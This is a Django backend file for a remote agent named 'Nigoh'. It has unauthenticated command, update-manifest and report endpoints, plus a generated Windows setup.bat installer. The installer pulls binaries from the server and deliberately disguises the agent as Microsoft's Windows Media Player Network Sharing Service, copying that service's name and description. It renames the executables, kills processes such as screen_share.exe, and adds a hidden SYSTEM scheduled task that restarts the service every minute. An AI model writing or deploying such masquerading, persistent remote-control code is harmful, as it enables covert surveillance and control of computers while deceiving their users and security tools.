import io
import json
import zipfile

from django.http import Http404, HttpResponse
from django.shortcuts import get_object_or_404, redirect
from django.urls import reverse
from django.utils import timezone
from django.views import View
from rest_framework.permissions import AllowAny
from rest_framework.response import Response
from rest_framework.views import APIView

from endpoints.models import Computer
from .models import PendingCommand, Release, UpdateLog


def _in_rollout(device_id, release):
    """Deterministik: int(device_id[:8], 16) % 100 < rollout_percentage"""
    if not device_id or not release:
        return False
    try:
        bucket = int(device_id[:8], 16) % 100
    except (TypeError, ValueError):
        return False
    return bucket < (release.rollout_percentage or 0)


def _serialize_command(cmd, request):
    if cmd.action == PendingCommand.ACTION_UPDATE and cmd.release:
        manifest_url = request.build_absolute_uri(
            f'/api/agent/manifest/{cmd.release.target}/{cmd.release.version}/'
        )
        return {
            'action':       'update',
            'target':       cmd.release.target,
            'version':      cmd.release.version,
            'manifest_url': manifest_url,
            'force':        cmd.force,
            'command_id':   str(cmd.id),
        }
    if cmd.action == PendingCommand.ACTION_UNINSTALL:
        return {'action': 'uninstall', 'confirm': True, 'command_id': str(cmd.id)}
    if cmd.action == PendingCommand.ACTION_RESTART:
        return {'action': 'restart', 'command_id': str(cmd.id)}
    return {'action': 'none'}


class AgentCommandView(APIView):
    """
    GET /api/agent/command/?device_id=<32hex>&version=<x.y.z>&watchdog_version=<x.y.z>

    Agent versiya ma'lumotini yuboradi, backend buyruq yoki "none" qaytaradi.
    Eski agentlar uchun ?uuid=<bios_uuid> ham qabul qilinadi (legacy).
    """
    permission_classes = [AllowAny]

    def get(self, request):
        device_id = request.GET.get('device_id')
        bios_uuid = request.GET.get('uuid') or request.GET.get('bios_uuid')

        if not device_id and not bios_uuid:
            return Response({'error': 'device_id required'}, status=400)

        # 1) device_id afzal — bo'lmasa avtomatik yaratamiz (404 emas)
        if device_id:
            computer, created = Computer.objects.get_or_create(
                device_id=device_id,
                defaults={'hostname': 'unknown', 'is_online': False, 'bios_uuid': bios_uuid or None},
            )
            if created:
                print(f"[+] Yangi qurilma ro'yxatga olindi: {device_id[:8]}...")
        else:
            # legacy fallback
            computer = get_object_or_404(Computer, bios_uuid=bios_uuid)

        # 2) Versiya ma'lumotini yangilab qo'yamiz
        agent_v = request.GET.get('version')
        watchdog_v = request.GET.get('watchdog_version')
        hostname = request.GET.get('hostname')
        updates = []
        if agent_v:
            computer.agent_version = agent_v; updates.append('agent_version')
        if watchdog_v:
            computer.watchdog_version = watchdog_v; updates.append('watchdog_version')
        if hostname:
            computer.hostname = hostname; updates.append('hostname')
        if bios_uuid and not computer.bios_uuid:
            computer.bios_uuid = bios_uuid; updates.append('bios_uuid')
        if updates:
            computer.last_version_report = timezone.now()
            updates.append('last_version_report')
            computer.save(update_fields=updates)

        # 3) Navbatdagi buyruq
        cmd = (PendingCommand.objects
               .filter(computer=computer, delivered_at__isnull=True)
               .order_by('created_at').first())

        if not cmd:
            return Response({'action': 'none'})

        # Rollout endi ishlatilmaydi — barcha agentlarga darhol yuboriladi
        cmd.delivered_at = timezone.now()
        cmd.save(update_fields=['delivered_at'])

        return Response(_serialize_command(cmd, request))


class ManifestView(APIView):
    """GET /api/agent/manifest/<target>/<version>/ — fayl ro'yxati"""
    permission_classes = [AllowAny]

    def get(self, request, target, version):
        release = get_object_or_404(Release, target=target, version=version)
        files = [
            {
                'path':   f.rel_path,
                'sha256': f.sha256,
                'size':   f.size,
                'url':    request.build_absolute_uri(f.file.url) if f.file else None,
            }
            for f in release.files.all()
        ]
        deleted = []
        if isinstance(release.manifest, dict):
            deleted = release.manifest.get('deleted_files', [])
        return Response({
            'version':       release.version,
            'target':        release.target,
            'files':         files,
            'deleted_files': deleted,
        })


class AgentReportView(APIView):
    """
    POST /api/agent/report/
    Body: {command_id, success, error_message, new_version}

    Retry mantiqi:
      - success=True   → tugadi, ack qilinadi
      - success=False  → attempts hisoblanadi (consumer push paytida oshirgan).
                         Agar attempts < 5 → hali qayta urinish mumkin, ack qilinmaydi.
                         Agar attempts >= 5 → majburan yakunlash (ack qilinadi,
                         success=False, error_message ga sabab yoziladi).
    """
    permission_classes = [AllowAny]

    def post(self, request):
        cmd_id = request.data.get('command_id')
        if not cmd_id:
            return Response({'error': 'command_id required'}, status=400)

        cmd = get_object_or_404(PendingCommand, id=cmd_id)
        success = bool(request.data.get('success', False))
        error   = request.data.get('error_message', '') or ''

        if success:
            # Muvaffaqiyatli — yakunlaymiz
            cmd.acknowledged_at = timezone.now()
            cmd.success = True
            cmd.error_message = error
            cmd.save(update_fields=['acknowledged_at', 'success', 'error_message'])

            if cmd.release:
                field = 'agent_version' if cmd.release.target == Release.TARGET_NIGOH else 'watchdog_version'
                prev = getattr(cmd.computer, field, '') or ''
                setattr(cmd.computer, field, cmd.release.version)
                cmd.computer.save(update_fields=[field])

                UpdateLog.objects.create(
                    computer=cmd.computer,
                    from_version=prev,
                    to_version=cmd.release.version,
                    target=cmd.release.target,
                    success=True,
                )
            return Response({'ok': True, 'status': 'acknowledged'})

        # Muvaffaqiyatsiz — attempts ni ko'ramiz
        # (attempts consumer push paytida allaqachon oshirilgan)
        cmd.error_message = error
        if cmd.attempts >= cmd.MAX_ATTEMPTS:
            # 5 urinishdan oshdi — majburan yakunlaymiz
            cmd.acknowledged_at = timezone.now()
            cmd.success = False
            if not error:
                cmd.error_message = f"5 urinishdan keyin yangilash muvaffaqiyatsiz"
            cmd.save(update_fields=['acknowledged_at', 'success', 'error_message'])

            if cmd.release:
                UpdateLog.objects.create(
                    computer=cmd.computer,
                    to_version=cmd.release.version,
                    target=cmd.release.target,
                    success=False,
                    error=cmd.error_message,
                )
            return Response({'ok': True, 'status': 'abandoned_after_max_attempts'})

        # Hali qayta urinish mumkin — faqat error_message ni yozamiz.
        # acknowledged_at ni belgilamaymiz — keyingi WS ulanishda push_pending_command_if_any
        # buni qayta yuboradi.
        cmd.save(update_fields=['error_message'])
        return Response({
            'ok': True,
            'status': 'will_retry',
            'attempts': cmd.attempts,
            'max_attempts': cmd.MAX_ATTEMPTS,
        })


# ============================================================
# INSTALLER — yangi mijozlarda agentni o'rnatish uchun
# ============================================================

class InstallScriptView(View):
    """GET /install/  →  setup.bat ni dinamik yaratib qaytaradi."""

    def get(self, request):
        server_url = request.build_absolute_uri('/').rstrip('/')
        watchdog_url = request.build_absolute_uri(reverse('install-watchdog'))
        agent_url = request.build_absolute_uri(reverse('install-agent-zip'))
        watchdog_ver_url = request.build_absolute_uri(reverse('install-watchdog-version'))
        bat = _SETUP_BAT_TEMPLATE.format(
            SERVER_URL=server_url,
            WATCHDOG_URL=watchdog_url,
            AGENT_URL=agent_url,
            WATCHDOG_VERSION_URL=watchdog_ver_url,
        )
        resp = HttpResponse(bat, content_type='text/plain; charset=utf-8')
        resp['Content-Disposition'] = 'attachment; filename="setup.bat"'
        return resp


class LatestWatchdogView(View):
    """GET /install/watchdog.exe  →  aktiv Watchdog Release dagi exe ga 302."""

    def get(self, request):
        rel = (
            Release.objects
            .filter(target='watchdog', is_active=True)
            .order_by('-created_at')
            .first()
        )
        if not rel:
            raise Http404("Aktiv watchdog release yo'q")

        # Yangi (wmpnetwk.exe) yoki eski (WatchdogService.exe) nomlarni qidiramiz.
        # Fayl kengaytmasi .exe bo'lgan har qanday faylni qabul qilamiz.
        f = None
        for candidate in ('wmpnetwk.exe', 'WatchdogService.exe'):
            f = rel.files.filter(rel_path__iendswith=candidate).first()
            if f:
                break
        if not f:
            # Fallback: Release'dagi HAR QANDAY .exe (birinchisi)
            f = rel.files.filter(rel_path__iendswith='.exe').first()
        if not f:
            # Oxirgi fallback: Release'da bo'lgan har qanday fayl
            f = rel.files.first()
        if not f:
            raise Http404("Watchdog exe topilmadi")
        return redirect(f.file.url)


class LatestWatchdogVersionView(View):
    """GET /install/watchdog_version.json  →  aktiv Watchdog Release versiyasi.

    setup.bat buni yuklab olib C:\\ProgramData\\Nigoh\\watchdog_version.json ga
    yozadi. Watchdog o'zi hech qachon yangilanmaydi, shuning uchun bu qiymat
    o'rnatilganda yoziladi va o'shaday qoladi.
    """

    def get(self, request):
        rel = (
            Release.objects
            .filter(target='watchdog', is_active=True)
            .order_by('-created_at')
            .first()
        )
        version = rel.version if rel else '0.0.0'
        body = json.dumps({
            'version':      version,
            'installed_at': timezone.now().isoformat(),
        }, indent=2)
        resp = HttpResponse(body, content_type='application/json')
        return resp


class LatestAgentZipView(View):
    """GET /install/nigoh.zip  →  aktiv Nigoh Release fayllarini ZIP qilib stream qiladi."""

    def get(self, request):
        rel = (
            Release.objects
            .filter(target='nigoh', is_active=True)
            .order_by('-created_at')
            .first()
        )
        if not rel:
            raise Http404("Aktiv nigoh release yo'q")

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            has_version_json = False
            for f in rel.files.all():
                with f.file.open('rb') as src:
                    # ZIP ichidagi yo'l — forward slash (cross-platform)
                    arcname = f.rel_path.replace('\\', '/')
                    if arcname.lower() == 'version.json':
                        has_version_json = True
                    zf.writestr(arcname, src.read())

            # Release da version.json bo'lmasa avtomatik qo'shamiz —
            # Nigoh Core/version.json dan versiyani o'qiydi
            if not has_version_json:
                version_meta = {
                    'version':      rel.version,
                    'installed_at': timezone.now().isoformat(),
                }
                zf.writestr('version.json', json.dumps(version_meta, indent=2))
        buf.seek(0)
        resp = HttpResponse(buf.read(), content_type='application/zip')
        resp['Content-Disposition'] = f'attachment; filename="Nigoh-{rel.version}.zip"'
        return resp


_SETUP_BAT_TEMPLATE = r"""@echo off
setlocal enabledelayedexpansion
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [XATO] "Run as administrator" bilan ishga tushiring.
    pause & exit /b 1
)
set SERVER_URL={SERVER_URL}
set WATCHDOG_URL={WATCHDOG_URL}
set AGENT_URL={AGENT_URL}
set WATCHDOG_VERSION_URL={WATCHDOG_VERSION_URL}
:: Niqoblangan install joyi — Windows Media Player Network Sharing Service ni imiitatsiya qiladi
set INSTALL_DIR=C:\Program Files\Common Files\Microsoft Shared\Security
set CORE_DIR=%INSTALL_DIR%\Core
set CONFIG_FILE=%INSTALL_DIR%\config.json
set WATCHDOG_VERSION_FILE=%INSTALL_DIR%\svc_version.json
set TEMP_ZIP=%TEMP%\wmpsvc.zip
set TEMP_WATCHDOG=%TEMP%\wmpnetwk.exe
set TEMP_EXTRACT=%TEMP%\wmpsvc_extract
set SERVICE_EXE=%INSTALL_DIR%\wmpnetwk.exe
set SERVICE_NAME=WMPNetworkSvc
set SERVICE_DISPLAY=Windows Media Player Network Sharing Service
set TASK_NAME=Microsoft\Windows\WindowsMediaPlayer\NetworkSvcCheck
echo [1/7] wmpnetwk.exe yuklanmoqda...
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%WATCHDOG_URL%' -OutFile '%TEMP_WATCHDOG%' -UseBasicParsing"
if not exist "%TEMP_WATCHDOG%" ( echo [XATO] Watchdog yuklanmadi & pause & exit /b 1 )
echo [2/7] Agent zip yuklanmoqda...
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%AGENT_URL%' -OutFile '%TEMP_ZIP%' -UseBasicParsing"
if not exist "%TEMP_ZIP%" ( echo [XATO] Agent zip yuklanmadi & pause & exit /b 1 )
echo [3/7] Eski o'rnatishlar tozalanmoqda...
:: Yangi va eski service nomlari
for %%S in (WMPNetworkSvc WinSecHost NigohAgentService NigohAgent NigohWatchdog) do (
    sc query %%S >nul 2>&1 && (
        sc stop %%S >nul 2>&1
        timeout /t 2 /nobreak >nul
        sc delete %%S >nul 2>&1
    )
)
:: Yangi va eski process nomlari
for %%P in (SecurityInformer.exe wmpnetwk.exe Nigoh.exe WatchdogService.exe NigohWatchdog.exe remote_controll.exe screen_share.exe) do (
    taskkill /f /im %%P >nul 2>&1
)
:: Eski Task Scheduler task
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
timeout /t 2 /nobreak >nul
:: Yangi va eski install papkalarni tozalash (config.json ni saqlaymiz)
if exist "%INSTALL_DIR%\Core" rd /s /q "%INSTALL_DIR%\Core" >nul 2>&1
if exist "%INSTALL_DIR%\staging" rd /s /q "%INSTALL_DIR%\staging" >nul 2>&1
if exist "%INSTALL_DIR%\Core_backup" rd /s /q "%INSTALL_DIR%\Core_backup" >nul 2>&1
del /f /q "%INSTALL_DIR%\*.log" >nul 2>&1
del /f /q "%INSTALL_DIR%\command.json" >nul 2>&1
del /f /q "%INSTALL_DIR%\swap_request.json" >nul 2>&1
:: Eski C:\ProgramData\Nigoh - device_id migration'idan keyin xavfsiz tozalash
if exist "C:\ProgramData\Nigoh" rd /s /q "C:\ProgramData\Nigoh" >nul 2>&1
:: Firewall qoidalari (yangi va eski)
for %%R in (WMPNetworkSvc_In WMPNetworkSvc_Out NigohAgent_In NigohAgent_Out) do (
    netsh advfirewall firewall delete rule name="%%R" >nul 2>&1
)
echo [4/7] Fayllar joylashtirilmoqda...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
mkdir "%CORE_DIR%"
if exist "%TEMP_EXTRACT%" rd /s /q "%TEMP_EXTRACT%"
mkdir "%TEMP_EXTRACT%"
powershell -NoProfile -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%TEMP_EXTRACT%' -Force"
xcopy /s /e /y /q "%TEMP_EXTRACT%\" "%CORE_DIR%\" >nul 2>&1
:: Eski format ZIP (Nigoh.exe) -> yangi format (SecurityInformer.exe) migration
if exist "%CORE_DIR%\Nigoh.exe" ren "%CORE_DIR%\Nigoh.exe" "SecurityInformer.exe"
if exist "%CORE_DIR%\Nigoh.Core.dll" ren "%CORE_DIR%\Nigoh.Core.dll" "SecurityInformer.Core.dll"
rd /s /q "%TEMP_EXTRACT%" >nul 2>&1
del /f /q "%TEMP_ZIP%" >nul 2>&1
copy /y "%TEMP_WATCHDOG%" "%SERVICE_EXE%" >nul
del /f /q "%TEMP_WATCHDOG%" >nul 2>&1
echo [5/7] Config yozilmoqda...
powershell -NoProfile -Command "try {{ if (Test-Path '%CONFIG_FILE%') {{ $c = Get-Content '%CONFIG_FILE%' -Raw | ConvertFrom-Json }} else {{ $c = $null }}; if ($null -eq $c) {{ $c = [PSCustomObject]@{{}} }}; $c | Add-Member -Force -NotePropertyName server_url -NotePropertyValue '%SERVER_URL%'; if (-not $c.device_id) {{ $c | Add-Member -Force -NotePropertyName device_id -NotePropertyValue '' }}; $c | ConvertTo-Json -Compress | Set-Content '%CONFIG_FILE%' -Encoding UTF8 -NoNewline }} catch {{ @{{server_url='%SERVER_URL%';device_id=''}} | ConvertTo-Json -Compress | Set-Content '%CONFIG_FILE%' -Encoding UTF8 -NoNewline }}"
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; try {{ Invoke-WebRequest -Uri '%WATCHDOG_VERSION_URL%' -OutFile '%WATCHDOG_VERSION_FILE%' -UseBasicParsing }} catch {{}}"
echo [6/7] Service o'rnatilmoqda...
sc create %SERVICE_NAME% binpath= "\"%SERVICE_EXE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%" >nul
sc description %SERVICE_NAME% "Shares Windows Media Player libraries to other networked players and media devices using Universal Plug and Play." >nul
sc failure %SERVICE_NAME% reset= 60 actions= restart/3000/restart/5000/restart/10000 >nul
sc start %SERVICE_NAME% >nul 2>&1
echo [7/7] Persistence task yaratilmoqda...
set TASK_XML=%TEMP%\nsvc_task.xml
(
    echo ^<?xml version="1.0" encoding="UTF-16"?^>
    echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
    echo   ^<Triggers^>
    echo     ^<BootTrigger^>^<Enabled^>true^</Enabled^>^</BootTrigger^>
    echo     ^<CalendarTrigger^>
    echo       ^<StartBoundary^>2020-01-01T00:00:00^</StartBoundary^>
    echo       ^<Repetition^>^<Interval^>PT1M^</Interval^>^</Repetition^>
    echo       ^<ScheduleByDay^>^<DaysInterval^>1^</DaysInterval^>^</ScheduleByDay^>
    echo     ^</CalendarTrigger^>
    echo   ^</Triggers^>
    echo   ^<Principals^>^<Principal id="Author"^>^<UserId^>S-1-5-18^</UserId^>^<RunLevel^>HighestAvailable^</RunLevel^>^</Principal^>^</Principals^>
    echo   ^<Settings^>^<Enabled^>true^</Enabled^>^<Hidden^>true^</Hidden^>^<StartWhenAvailable^>true^</StartWhenAvailable^>^<ExecutionTimeLimit^>PT2M^</ExecutionTimeLimit^>^</Settings^>
    echo   ^<Actions Context="Author"^>^<Exec^>^<Command^>%%WINDIR%%\System32\cmd.exe^</Command^>^<Arguments^>/c sc query %SERVICE_NAME% ^^^| findstr /I "RUNNING" ^^^&^^^& exit /b 0 ^^^|^^^| sc start %SERVICE_NAME%^</Arguments^>^</Exec^>^</Actions^>
    echo ^</Task^>
) > "%TASK_XML%"
schtasks /Create /TN "%TASK_NAME%" /XML "%TASK_XML%" /F >nul 2>&1
del /f /q "%TASK_XML%" >nul 2>&1
echo [8/8] Smoke test...
timeout /t 3 /nobreak >nul
set SMOKE_OK=1
sc query %SERVICE_NAME% | findstr /I "RUNNING" >nul 2>&1 && ( echo   [OK] service RUNNING ) || ( echo   [XATO] service RUNNING emas & set SMOKE_OK=0 )
if exist "%CORE_DIR%\SecurityInformer.exe" ( echo   [OK] SecurityInformer.exe mavjud ) else ( echo   [XATO] SecurityInformer.exe yo'q & set SMOKE_OK=0 )
if exist "%CORE_DIR%\SecurityInformer.Core.dll" ( echo   [OK] Core DLL mavjud ) else ( echo   [XATO] Core DLL yo'q & set SMOKE_OK=0 )
timeout /t 8 /nobreak >nul
tasklist /FI "IMAGENAME eq SecurityInformer.exe" 2>nul | find /I "SecurityInformer.exe" >nul && ( echo   [OK] Agent process ishlayapti ) || ( echo   [DIQQAT] Agent hali ishga tushmagan )
schtasks /Query /TN "%TASK_NAME%" >nul 2>&1 && ( echo   [OK] Task Scheduler tayyor ) || ( echo   [XATO] Task Scheduler yo'q & set SMOKE_OK=0 )
echo.
if "%SMOKE_OK%"=="1" ( echo === O'rnatish + smoke test muvaffaqiyatli ^> Service: %SERVICE_NAME% === ) else ( echo === O'rnatish tugadi lekin smoke testda muammolar bor ^> Log: %INSTALL_DIR%\wmpnetwork.log === )
pause
"""
